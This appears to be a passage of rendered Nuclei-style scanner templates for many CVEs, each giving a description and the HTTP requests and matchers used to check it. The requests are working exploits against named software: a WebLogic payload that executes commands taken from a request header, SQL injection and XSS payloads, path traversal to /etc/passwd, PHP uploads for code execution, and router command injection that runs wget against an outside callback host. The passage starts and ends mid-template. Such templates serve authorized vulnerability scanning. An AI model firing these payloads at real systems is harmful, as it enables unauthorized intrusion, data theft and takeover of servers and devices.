_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();
weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
field.setAccessible(true);
Object obj = field.get(adapter);
weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);
String cmd = req.getHeader("cmd");
String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
if (cmd != null) {
    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
    weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);
    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
    res.getServletOutputStream().flush();
    res.getWriter().write("");
}executeThread.interrupt();
");

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - word**

- part - header
- words
  1. ADMINCONSOLESESSION=

**Type - regex**

- part - body
- regex
  1. \<html>\<head>\</head>\<body>(.\*)\</body>\</html>

---

# Sourcecodester Hotel and Lodge Management System 2.0 - SQL Injection

## Description

- Sourcecodester Hotel and Lodge Management System 2.0 is vulnerable to unauthenticated SQL injection and can allow remote attackers to execute arbitrary SQL commands via the email parameter to the edit page for Customer, Room, Currency, Room Booking Details, or Tax Details.

- severity - critical
- tags - cve,cve2020,hotel,sqli,unauth

## Requests

### Step - 1

```
POST /forgot_password.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

btn_forgot=1&email=1%27%20or%20sleep(6)%23

```

### Matchers

**Type - dsl**

- dsl
  1. duration>=6
  2. status_code == 200
  3. contains(body, "Hotel Booking System")
- condition - and

---

# MicroWeber - Unauthenticated User Database Disclosure

## Description

- The PHP code for controller.php run Laravel's dump and die function on the users database. Dump and die simply prints the contents of the entire PHP variable (in this case, the users database) out to HTML.

- severity - high
- tags - cve,cve2020,microweber,unauth,disclosure

## Requests

### Step - 1

```
POST /module/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: {{BaseURL}}admin/view:modules/load_module:users

module={{endpoint}}

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body,"username")
  2. contains(body,"password")
  3. contains(body,"password_reset_hash")
  4. status_code==200
  5. contains(all_headers,"text/html")
- condition - and

**Payloads**- endpoint

---

# Oracle WebLogic Server - Remote Code Execution

## Description

- Oracle WebLogic Server (Oracle Fusion Middleware (component: WLS Core Components) is susceptible to a remote code execution vulnerability. Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 2.2.1.3.0 and 12.2.1.4.0. This easily exploitable vulnerability could allow unauthenticated attackers with network access via IIOP to compromise Oracle WebLogic Server.

- severity - critical
- tags - cve,cve2020,oracle,weblogic,rce,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/console/login/LoginForm.jsp

### Matchers

**Type - word**

- words
  1. 10.3.6.0
  2. 12.1.3.0
  3. 12.2.1.3
  4. 12.2.1.4
- condition - or
- part - body

**Type - word**

- words
  1. WebLogic
- part - body

**Type - status**

- status
  1. 200

---

# SEOWON INTECH SLC-130 & SLR-120S - Unauthenticated Remote Code Execution

## Description

- SEOWON INTECH SLC-130 and SLR-120S devices allow remote code execution via the ipAddr parameter to the system_log.cgi page.
- severity - critical
- tags - seowon,cve2020,oast,packetstorm,rce,router,unauth,iot,cve

## Requests

### Step - 1

```
POST /cgi-bin/login.cgi HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}
Referer: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

browserTime=081119502020&currentTime=1597159205&expires=Wed%252C%2B12%2BAug%2B2020%2B15%253A20%253A05%2BGMT&Command=Submit&user=admin&password=admin

```

### Step - 2

```
POST /cgi-bin/system_log.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

Command=Diagnostic&traceMode=ping&reportIpOnly=&pingIpAddr=;wget http://{{interactsh-url}}&pingPktSize=56&pingTimeout=30&pingCount=4&maxTTLCnt=30&queriesCnt=3&reportIpOnlyCheckbox=on&logarea=com.cgi&btnApply=Apply&T=1646950471018

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Atlassian Jira Unauth User Enumeration

## Description

- Affected versions of Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate users via an Information Disclosure vulnerability in the QueryComponentRendererValue!Default.jspa endpoint. The affected versions are before version 8.5.13, from version 8.6.0 before 8.13.5, and from version 8.14.0 before 8.15.1.
- severity - medium
- tags - cve,cve2020,jira,atlassian,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
- {{BaseURL}}/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin

### Matchers

**Type - word**

- part - body
- words
  1. rel=\"admin\"

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# NETGEAR ProSAFE Plus - Unauthenticated Remote Code Execution

## Description

- NETGEAR ProSAFE Plus before 2.6.0.43 is susceptible to unauthenticated remote code execution. Any HTML page is allowed as a valid endpoint to submit POST requests, allowing debug action via the submitId and debugCmd parameters. The problem is publicly exposed in the login.html webpage, which has to be publicly available to perform login requests but does not implement any restriction for executing debug actions. This will allow attackers to execute system commands.
- severity - critical
- tags - cve,cve2020,netgear,rce,oast,router,unauth,kev

## Requests

### Step - 1

```
POST /login.htm HTTP/1.1
Host: {{Hostname}}
Accept: */*

submitId=debug&debugCmd=wget+http://{{interactsh-url}}&submitEnd=

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

---

# Multi Restaurant Table Reservation System 1.0 - SQL Injection

## Description

- The file view-chair-list.php in Multi Restaurant Table Reservation System 1.0 does not perform input validation on the table_id parameter which allows unauthenticated SQL Injection. An attacker can send malicious input in the GET request to /dashboard/view-chair-list.php?table_id= to trigger the vulnerability.

- severity - critical
- tags - cve2020,tablereservation,sqli,unauth,edb,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/dashboard/view-chair-list.php?table_id='+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-

### Matchers

**Type - dsl**

- dsl
  1. duration>=6

**Type - word**

- part - body
- words
  1. Restaurent Tables
  2. Chair List
- condition - and

**Type - status**

- status
  1. 200

---

# Sony IPELA Engine IP Camera - Hardcoded Account

## Description

- Multiple SONY network cameras are vulnerable to sensitive information disclosure via hardcoded credentials.

- severity - high
- tags - sony,backdoor,unauth,telnet,iot,camera

## Requests

- Method - GET

### URL

- {{BaseURL}}/command/prima-factory.cgi

### Matchers

**Type - word**

- part - header
- words
  1. gen5th
  2. gen6th
- condition - or

**Type - status**

- status
  1. 204

---

# Seagate NAS OS 4.3.15.1 - Server Information Disclosure

## Description

- Seagate NAS OS version 4.3.15.1 has insufficient access control which allows attackers to obtain information about the NAS without authentication via empty POST requests in /api/external/7.0/system.System.get_infos.
- severity - high
- tags - cve,cve2018,seagate,nasos,disclosure,unauth

## Requests

### Step - 1

```
POST /api/external/7.0/system.System.get_infos HTTP/1.1
Host: {{Hostname}}
Referer: {{BaseURL}}

```

### Matchers

**Type - word**

- part - body
- words
  1. "version":
  2. "serial_number":
- condition - and

### Extractors

**Type - regex**

- part - body
- group - 1
- regex
  1. "version": "([0-9.]+)"

---

# ManageEngine ServiceDesk 9.3.9328 - Arbitrary File Retrieval

## Description

- ManageEngine ServiceDesk 9.3.9328 is vulnerable to an arbitrary file retrieval due to improper restrictions of the pathname used in the name parameter for the download-snapshot path. An unauthenticated remote attacker can use this vulnerability to download arbitrary files.

- severity - high
- tags - cve,cve2017,manageengine,lfr,unauth,tenable

## Requests

- Method - GET

### URL

- {{BaseURL}}/fosagent/repl/download-file?basedir=4&filepath=..\..\Windows\win.ini
- {{BaseURL}}/fosagent/repl/download-snapshot?name=..\..\..\..\..\..\..\Windows\win.ini

### Matchers

**Type - word**

- part - body
- words
  1. bit app support
  2. fonts
  3. extensions
- condition - and

---

# Kentico - Installer Privilege Escalation

## Description

- Kentico 9.0 before 9.0.51 and 10.0 before 10.0.48 are susceptible to a privilege escalation attack. An attacker can obtain Global Administrator access by visiting CMSInstall/install.aspx and then navigating to the CMS Administration Dashboard.

- severity - critical
- tags - cve,cve2017,kentico,cms,install,unauth,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/CMSInstall/install.aspx

### Matchers

**Type - word**

- words
  1. Kentico
  2. Database Setup
  3. SQLServer
- condition - and

**Type - word**

- words
  1. Database Setup
  2. SQLServer
- condition - and

---

# MantisBT \<=2.30 - Arbitrary Password Reset/Admin Access

## Description

- MantisBT through 2.3.0 allows arbitrary password reset and unauthenticated admin access via an empty confirm_hash value to verify.php.

- severity - high
- tags - cve,cve2017,mantisbt,unauth,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/verify.php?id=1&confirm_hash=
- {{BaseURL}}/mantis/verify.php?id=1&confirm_hash=
- {{BaseURL}}/mantisBT/verify.php?id=1&confirm_hash=
- {{BaseURL}}/mantisbt-2.3.0/verify.php?id=1&confirm_hash=
- {{BaseURL}}/bugs/verify.php?confirm_hash=&id=1

### Matchers

**Type - word**

- part - body
- words
  1. \<input type="hidden" name="account*update_token" value="([a-zA-Z0-9*-]+)"

**Type - status**

- status
  1. 200

---

# Ultimate Weather Plugin \<= 1.0 - Cross-Site Scripting

## Description

- The ultimate-weather plugin 1.0 for WordPress contains a cross-site scripting vulnerability.
- severity - medium
- tags - cve,cve2014,wordpress,wp-plugin,xss,weather,wpscan,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/ultimate-weather-plugin/magpierss/scripts/magpie_debug.php?url=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. ">\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Import Legacy Media \<= 0.1 - Cross-Site Scripting

## Description

- A cross-site scripting vulnerability in the Import Legacy Media plugin 0.1 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the filename parameter to getid3/demos/demo.mimeonly.php.
- severity - medium
- tags - wpscan,cve,cve2014,wordpress,wp-plugin,xss,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/import-legacy-media/getid3/demos/demo.mimeonly.php?filename=filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. '>\</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Podcast Channels \< 0.28 - Cross-Site Scripting

## Description

- The Podcast Channels WordPress plugin was affected by an unauthenticated reflected cross-site scripting security vulnerability.
- severity - medium
- tags - wpscan,cve,cve2014,wordpress,wp-plugin,xss,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/podcast-channels/getid3/demos/demo.write.php?Filename=Filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Shortcode Ninja \<= 1.4 - Cross-Site Scripting

## Description

- A cross-site scripting vulnerability in preview-shortcode-external.php in the Shortcode Ninja plugin 1.4 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the shortcode parameter.
- severity - medium
- tags - wordpress,wp-plugin,xss,wpscan,cve,cve2014,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/shortcode-ninja/preview-shortcode-external.php?shortcode=shortcode%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3e

### Matchers

**Type - word**

- words
  1. '>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Infusionsoft Gravity Forms Add-on \< 1.5.7 - Cross-Site Scripting

## Description

- Multiple cross-site scripting vulnerabilities in tests/notAuto_test_ContactService_pauseCampaign.php in the Infusionsoft Gravity Forms plugin before 1.5.6 for WordPress allow remote attackers to inject arbitrary web script or HTML via the (1) go, (2) contactId, or (3) campaignId parameter.
- severity - medium
- tags - wpscan,cve,cve2014,wordpress,wp-plugin,xss,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/infusionsoft/Infusionsoft/tests/notAuto_test_ContactService_pauseCampaign.php?go=go%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&contactId=contactId%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&campaignId=campaignId%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&

### Matchers

**Type - word**

- words
  1. ">\</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Frontend Uploader \<= 0.9.2 - Cross-Site Scripting

## Description

- The Frontend Uploader WordPress plugin prior to v.0.9.2 was affected by an unauthenticated Cross-Site Scripting security vulnerability.
- severity - medium
- tags - wp-plugin,xss,wpscan,packetstorm,cve,cve2014,wordpress,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/?page_id=0&&errors[fu-disallowed-mime-type][0][name]=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Movies \<= 0.6 - Cross-Site Scripting

## Description

- A cross-site scripting vulnerability in the Movies plugin 0.6 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the filename parameter to getid3/demos/demo.mimeonly.php.
- severity - medium
- tags - wordpress,wp-plugin,xss,wpscan,cve,cve2014,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/movies/getid3/demos/demo.mimeonly.php?filename=filename%27%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&

### Matchers

**Type - word**

- words
  1. '>\<script>alert(document.cookie)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WooCommerce Swipe \<= 2.7.1 - Cross-Site Scripting

## Description

- A cross-site scripting vulnerability in test-plugin.php in the Swipe Checkout for WooCommerce plugin 2.7.1 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the api_url parameter.
- severity - medium
- tags - wpscan,cve,cve2014,wordpress,wp-plugin,xss,woocommerce,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/swipehq-payment-gateway-woocommerce/test-plugin.php?api_url=api_url%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E

### Matchers

**Type - word**

- words
  1. '>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WP Planet \<= 0.1 - Cross-Site Scripting

## Description

- A cross-site scripting vulnerability in rss.class/scripts/magpie_debug.php in the WP-Planet plugin 0.1 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the url parameter.
- severity - medium
- tags - cve2014,wordpress,wp-plugin,xss,wpscan,cve,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wp-planet/rss.class/scripts/magpie_debug.php?url=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# SaltStack Salt \<3002.5 - Auth Bypass

## Description

- SaltStack Salt before 3002.5 does not honor eauth credentials for the wheel_async client, allowing attackers to remotely run any wheel modules on the master.
- severity - critical
- tags - cve,cve2021,saltapi,rce,saltstack,unauth

## Requests

### Step - 1

```
POST /run HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"client":"wheel_async","fun":"pillar_roots.write","data":"testing","path":"../../../../../../../tmp/testing","username":"1","password":"1","eauth":"pam"}

```

### Matchers

**Type - word**

- part - body
- words
  1. return
  2. tag
  3. jid
  4. salt
  5. wheel
- condition - and

**Type - status**

- status
  1. 200

---

# Patreon WordPress \< 1.7.0 - Unauthenticated Local File Disclosure

## Description

- The Jetpack Scan team identified a Local File Disclosure vulnerability in the Patreon WordPress plugin before 1.7.0 that could be abused by anyone visiting the site. Using this attack vector, an attacker could leak important internal files like wp-config.php, which contains database credentials and cryptographic keys used in the generation of nonces and cookies.
- severity - high
- tags - wordpress,patreon-connect,unauth,cve2021,lfi,patreon,wp,wpscan,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/?patron_only_image=../../../../../../../../../../etc/passwd&patreon_action=serve_patron_only_image

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# Maian Cart \<=3.8 - Remote Code Execution

## Description

- Maian Cart 3.0 to 3.8 via the elFinder file manager plugin contains a remote code execution vulnerability.
- severity - critical
- tags - cve,cve2021,rce,unauth,maian

## Requests

### Step - 1

```
GET /admin/index.php?p=ajax-ops&op=elfinder&cmd=mkfile&name={{randstr}}.php&target=l1_Lw HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Step - 2

```
POST /admin/index.php?p=ajax-ops&op=elfinder HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

cmd=put&target={{hash}}&content=%3c%3fphp%20echo%20%22{{randstr_1}}%22%3b%20%3f%3e

```

### Step - 3

```
GET /product-downloads/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}
Accept: */*

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_3, "{{randstr_1}}")
  2. status_code_3 == 200
- condition - and

### Extractors

**Type - regex**

- name - hash
- internal - True
- group - 1
- regex
  1. "hash"\:"(.\*?)"\,

---

# WPS Hide Login \< 1.9.1 - Protection Bypass with Referer-Header

## Description

- The plugin has a bug which allows to get the secret login page by setting a random referer string and making a request to /wp-admin/options.php as an unauthenticated user.
- severity - high
- tags - cve2021,wp,wordpress,wp-plugin,unauth,wpscan,cve

## Requests

### Step - 1

```
GET /wp-admin/options.php HTTP/1.1
Host: {{Hostname}}
Referer: something

```

### Matchers

**Type - word**

- part - header
- words
  1. redirect_to=%2Fwp-admin%2Fsomething&reauth=1

**Type - dsl**

- dsl
  1. !contains(tolower(location), 'wp-login.php')

### Extractors

**Type - kval**

- kval
  1. location

---

# Reolink E1 Zoom Camera \<=3.0.0.716 - Private Key Disclosure

## Description

- Reolink E1 Zoom Camera versions 3.0.0.716 and below suffer from a private key (RSA) disclosure vulnerability.

- severity - medium
- tags - cve,cve2021,reolink,camera,iot,exposure,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/self.key

### Matchers

**Type - word**

- words
  1. -----BEGIN RSA PRIVATE KEY-----
  2. -----END RSA PRIVATE KEY----
- condition - and

**Type - status**

- status
  1. 200

---

# GitLab GraphQL API User Enumeration

## Description

- An unauthenticated remote attacker can leverage this vulnerability to collect registered GitLab usernames, names, and email addresses.
- severity - medium
- tags - cve,cve2021,gitlab,api,graphql,enum,unauth

## Requests

### Step - 1

```
POST /api/graphql HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept: */*
Origin: {{RootURL}}
Referer: {{RootURL}}/-/graphql-explorer

{"query":"# Welcome to GraphiQL\n#\n# GraphiQL is an in-browser tool for writing, validating, and\n# testing GraphQL queries.\n#\n# Type queries into this side of the screen, and you will see intelligent\n# typeaheads aware of the current GraphQL type schema and live syntax and\n# validation errors highlighted within the text.\n#\n# GraphQL queries typically start with a \"{\" character. Lines that starts\n# with a # are ignored.\n#\n# An example GraphQL query might look like:\n#\n#     {\n#       field(arg: \"value\") {\n#         subField\n#       }\n#     }\n#\n# Keyboard shortcuts:\n#\n#  Prettify Query:  Shift-Ctrl-P (or press the prettify button above)\n#\n#       Run Query:  Ctrl-Enter (or press the play button above)\n#\n#   Auto Complete:  Ctrl-Space (or just start typing)\n#\n\n{\n  users {\n    nodes {\n      id\n      name\n      username\n    }\n  }\n}","variables":null,"operationName":null}

```

### Matchers

**Type - word**

- part - body
- words
  1. "data"
  2. "users"
  3. "nodes"
  4. "id"
  5. gid://
- condition - and

**Type - status**

- status
  1. 200

### Extractors

**Type - json**

- json
  1. .data.users.nodes[].username

---

# WordPress Imagements \<=1.2.5 - Arbitrary File Upload

## Description

- WordPress Imagements plugin through 1.2.5 is susceptible to arbitrary file upload which can lead to remote code execution. The plugin allows images to be uploaded in comments but only checks for the Content-Type in the request to forbid dangerous files. An attacker can upload arbitrary files by using a valid image Content-Type along with a PHP filename and code.

- severity - critical
- tags - cve,wp,unauth,imagements,wpscan,cve2021,fileupload,wordpress,wp-plugin,intrusive

## Requests

### Step - 1

```
POST /wp-comments-post.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIYl2Oz8ptq5OMtbU

------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="comment"

{{randstr}}
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="author"

{{randstr}}
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="email"

{{randstr}}@email.com
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="url"

------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="checkbox"


yes
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="naam"

{{randstr}}
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="image"; filename="{{php}}"
Content-Type: image/jpeg

<?php echo 'CVE-2021-24236'; ?>

------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="submit"

Post Comment
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="comment_post_ID"

{{post}}
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU
Content-Disposition: form-data; name="comment_parent"

0
------WebKitFormBoundaryIYl2Oz8ptq5OMtbU--

```

### Step - 2

```
GET /wp-content/plugins/imagements/images/{{php}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body_2
- words
  1. CVE-2021-24236

---

# D-Link DIR-615 - Unauthorized Access

## Description

- The WAN configuration page "wan.htm" on D-Link DIR-615 devices with firmware 20.06 can be accessed directly without authentication which can lead to disclose the information about WAN settings and also leverage attacker to modify the data fields of page.

- severity - critical
- tags - cve,cve2021,d-link,router,unauth,dir-615,roteador

## Requests

- Method - GET

### URL

- {{BaseURL}}/wan.htm

### Matchers

**Type - word**

- part - body
- words
  1. src='menu.js?v="+Math.random()+"'>\</scr"+"ipt>");
  2. var ipv6conntype
- condition - and

**Type - word**

- part - header
- words
  1. Virtual Web

**Type - status**

- status
  1. 200

---

# Auerswald COMpact 5500R 7.8A and 8.0B Devices Backdoor

## Description

- Auerswald COMpact 5500R 7.8A and 8.0B devices contain an unauthenticated endpoint ("https://192.168.1[.]2/about_state"), enabling the bad actor to gain backdoor access to a web interface that allows for resetting the administrator password.
- severity - critical
- tags - cve,cve2021,iot,unauth,voip,auerswald

## Requests

- Method - GET

### URL

- {{BaseURL}}/about_state

### Matchers

**Type - word**

- part - body
- words
  1. "pbx"
  2. "dongleStatus":0
  3. "macaddr"
- condition - and

**Type - word**

- part - header
- words
  1. application/json

**Type - status**

- status
  1. 200

---

# Grafana Unauthenticated Snapshot Creation

## Description

- Grafana 6.7.3 through 7.4.1 snapshot functionality can allow an unauthenticated remote attacker to trigger a Denial of Service via a remote API call if a commonly used configuration is set.
- severity - high
- tags - cve,cve2021,grafana,unauth

## Requests

### Step - 1

```
POST /api/snapshots HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"dashboard": {"editable":false,"hideControls":true,"nav":[{"enable":false,"type":"timepicker"}],"rows": [{}],"style":"dark","tags":[],"templating":{"list":[]},"time":{},"timezone":"browser","title":"Home","version":5},"expires": 3600}

```

### Matchers

- part - body

**Type - word**

- words
  1. "deleteUrl":
  2. "deleteKey":
- condition - and

**Type - word**

- part - header
- words
  1. application/json

---

# WordPress English Admin \<1.5.2 - Open Redirect

## Description

- WordPress English Admin plugin before 1.5.2 contains an open redirect vulnerability. The plugin does not validate the admin_custom_language_return_url before redirecting users to it. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
- severity - medium
- tags - cve2021,unauth,wpscan,wp-plugin,redirect,wordpress,wp,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=heartbeat&admin_custom_language_toggle=1&admin_custom_language_return_url=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WordPress Perfect Survey\<1.5.2 - SQL Injection

## Description

- Perfect Survey WordPress plugin before 1.5.2 does not validate and escape the question_id GET parameter before using it in a SQL statement in the get_question AJAX action, allowing unauthenticated users to perform SQL injection.

- severity - critical
- tags - cve,wpscan,cve2021,sqli,wp,wordpress,wp-plugin,unauth,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=get_question&question_id=1%20AND%20(SELECT%207242%20FROM%20(SELECT(SLEEP(4)))HQYx)

### Matchers

**Type - dsl**

- dsl
  1. duration>=4

**Type - word**

- part - header
- words
  1. wp-ps-session

**Type - status**

- status
  1. 404

---

# ImpressCMS - Incorrect Authorization

## Description

- ImpressCMS before 1.4.3 has Incorrect Access Control because include/findusers.php allows access by unauthenticated attackers (who are, by design, able to have a security token).
- severity - medium
- tags - hackerone,cve,cve2021,impresscms,unauth,cms

## Requests

### Step - 1

```
GET /misc.php?action=showpopups&type=friend HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36

```

### Step - 2

```
GET /include/findusers.php?token={{token}} HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36

```

### Matchers

**Type - word**

- part - body_2
- words
  1. last_login
  2. user_regdate
  3. uname
- condition - and

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- name - token
- internal - True
- group - 1
- regex
  1. REQUEST' value='(.\*?)'
  2. REQUEST" value="(.\*?)"

---

# WordPress Kaswara Modern VC Addons \<=3.0.1 - Arbitrary File Upload

## Description

- WordPress Kaswara Modern VC Addons plugin through 3.0.1 is susceptible to an arbitrary file upload. The plugin allows unauthenticated arbitrary file upload via the uploadFontIcon AJAX action, which can be used to obtain code execution. The supplied zipfile is unzipped in the wp-content/uploads/kaswara/fonts_icon directory with no checks for malicious files such as PHP.

- severity - critical
- tags - intrusive,unauth,fileupload,wpscan,cve,wordpress,wp-plugin,rce,cve2021,wp

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php?action=uploadFontIcon HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=------------------------d3be34324392a708

--------------------------d3be34324392a708
Content-Disposition: form-data; name="fonticonzipfile"; filename="{{zip_file}}.zip"
Content-Type: application/octet-stream

{{hex_decode('504B03040A0000000000FA73F454B2333E07140000001400000006001C00')}}{{php_file}}{{hex_decode('555409000366CBD76267CBD76275780B000104F50100000414000000')}}{{php_cmd}}{{hex_decode('0A504B01021E030A00000000002978F454E49BC1591300000013000000060018000000000001000000A48100000000')}}{{php_file}}{{hex_decode('555405000366CBD76275780B000104F50100000414000000504B050600000000010001004C000000530000000000')}}
--------------------------d3be34324392a708
Content-Disposition: form-data; name="fontsetname"

{{zip_file}}
--------------------------d3be34324392a708
Content-Disposition: form-data; name="action"

uploadFontIcon
--------------------------d3be34324392a708--

```

### Step - 2

```
GET /wp-content/uploads/kaswara/fonts_icon/{{zip_file}}/{{php_file}} HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body_1
- words
  1. wp-content/uploads/kaswara/fonts_icon/{{zip_file}}/style.css

**Type - word**

- part - body_2
- words
  1. phpinfo()

**Type - status**

- status
  1. 200

---

# WPCargo \< 6.9.0 - Unauthenticated Remote Code Execution

## Description

- The WPCargo Track & Trace WordPress plugin before 6.9.0 contains a file which could allow unauthenticated attackers to write a PHP file anywhere on the web server, leading to RCE.

- severity - critical
- tags - rce,wpcargo,unauth,cve,cve2021,wordpress,wp,wp-plugin,wpscan

## Requests

### Step - 1

```
GET /wp-content/plugins/wpcargo/includes/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
